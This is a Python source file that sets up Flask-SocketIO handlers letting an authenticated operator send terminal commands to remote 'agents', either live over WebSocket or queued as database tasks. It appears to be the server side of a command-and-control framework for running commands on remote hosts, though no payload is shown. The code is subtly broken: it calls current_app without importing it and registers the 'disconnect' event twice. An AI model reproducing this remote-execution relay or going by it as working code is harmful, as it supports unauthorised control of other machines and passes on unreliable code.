from flask_login import current_user
from flask_socketio import SocketIO, join_room, leave_room, emit
from glycon.config import CONFIG
import sqlite3
from datetime import datetime
import json
import os
from glycon.secure_comms import SecureComms

def init_socket_handlers(socketio):
    active_agents = {}  # Track active WebSocket connections
    
    @socketio.on('connect', namespace='/terminal')
    def handle_terminal_connect():
        if current_user.is_authenticated:
            print(f"Terminal client connected: {current_user.id}")

    @socketio.on('disconnect', namespace='/terminal')
    def handle_terminal_disconnect():
        print("Terminal client disconnected")

    @socketio.on('join', namespace='/terminal')
    def handle_join_terminal(data):
        agent_id = data.get('agent_id')
        if agent_id and current_user.is_authenticated:
            join_room(f"terminal_{agent_id}", namespace='/terminal')
            emit('status', {
                'status': 'connected',
                'agent_id': agent_id
            }, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('command', namespace='/terminal')
    def handle_terminal_command(data):
        if not current_user.is_authenticated:
            return
            
        agent_id = data.get('agent_id')
        command = data.get('command')
        current_dir = data.get('current_dir', '')
        
        if not agent_id or not command:
            return
            
        # Forward command directly to agent if connected via WebSocket
        if agent_id in active_agents:
            emit('command', {
                'command': command,
                'current_dir': current_dir
            }, room=f"agent_{agent_id}", namespace='/terminal')
        else:
            # Fallback to task-based execution if WebSocket not connected
            try:
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                
                task_data = {
                    'type': 'terminal',
                    'command': command,
                    'current_dir': current_dir,
                    'terminal': True,
                    'timestamp': datetime.now().isoformat()
                }
                
                c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                        (None, 
                        agent_id, 
                        'terminal', 
                        json.dumps(task_data),
                        'pending',
                        datetime.now().isoformat(),
                        None))
                
                conn.commit()
                task_id = c.lastrowid
                conn.close()
                
                emit('terminal_output', {
                    'agent_id': agent_id,
                    'command': command,
                    'output': f"Command queued (Task ID: {task_id})",
                    'task_id': task_id,
                    'current_dir': current_dir
                }, room=f"terminal_{agent_id}", namespace='/terminal')
                
            except Exception as e:
                emit('terminal_output', {
                    'agent_id': agent_id,
                    'error': f"Command submission failed: {str(e)}",
                    'current_dir': current_dir
                }, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('ws_control', namespace='/terminal')
    def handle_ws_control(data):
        if not current_user.is_authenticated:
            return
            
        agent_id = data.get('agent_id')
        action = data.get('action')
        
        if not agent_id or action not in ['start', 'stop']:
            return
            
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            task_data = {
                'type': 'websocket',
                'action': action,
                'timestamp': datetime.now().isoformat()
            }
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, 
                    agent_id, 
                    'websocket', 
                    json.dumps(task_data),
                    'pending',
                    datetime.now().isoformat(),
                    None))
            
            conn.commit()
            task_id = c.lastrowid
            conn.close()
            
            emit('ws_status', {
                'agent_id': agent_id,
                'action': action,
                'status': 'pending',
                'task_id': task_id
            }, room=f"terminal_{agent_id}", namespace='/terminal')
            
        except Exception as e:
            emit('ws_status', {
                'agent_id': agent_id,
                'error': f"WebSocket control failed: {str(e)}"
            }, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('agent_connect', namespace='/terminal')
    def handle_agent_connect(data):
        try:
            # Verify agent authentication
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                if current_app.config.get('DEBUG'):
                    print(f"[!] Invalid auth token from {data['agent_id']}")
                return False
            
            join_room(f"agent_{data['agent_id']}", namespace='/terminal')
            active_agents[data['agent_id']] = True
            
            # Update database with WebSocket connection status
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("UPDATE agents SET ws_connected=1 WHERE id=?", (data['agent_id'],))
            conn.commit()
            conn.close()
            
            if current_app.config.get('DEBUG'):
                print(f"[+] Agent {data['agent_id']} connected via WebSocket")
            
            # Notify terminal interface
            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"agent_{data['agent_id']}", namespace='/terminal')
            
            emit('status', {
                'status': 'connected',
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            emit('ws_status', {
                'agent_id': data['agent_id'],
                'action': 'start',
                'status': 'success',
                'message': 'WebSocket connection established'
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            return True
        except Exception as e:
            if current_app.config.get('DEBUG'):
                print(f"[!] Agent connection error: {str(e)}")
            emit('ws_status', {
                'agent_id': data['agent_id'],
                'action': 'start',
                'status': 'error',
                'message': str(e)
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            return False

    @socketio.on('disconnect', namespace='/terminal')
    def handle_agent_disconnect():
        # Clean up any agent connections on disconnect
        for agent_id in list(active_agents.keys()):
            if f"agent_{agent_id}" in socketio.server.manager.rooms['/terminal']:
                active_agents.pop(agent_id, None)
                # Update database with WebSocket disconnection status
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()
                
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"terminal_{agent_id}", namespace='/terminal')
                
                emit('ws_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'WebSocket disconnected'
                }, room=f"terminal_{agent_id}", namespace='/terminal')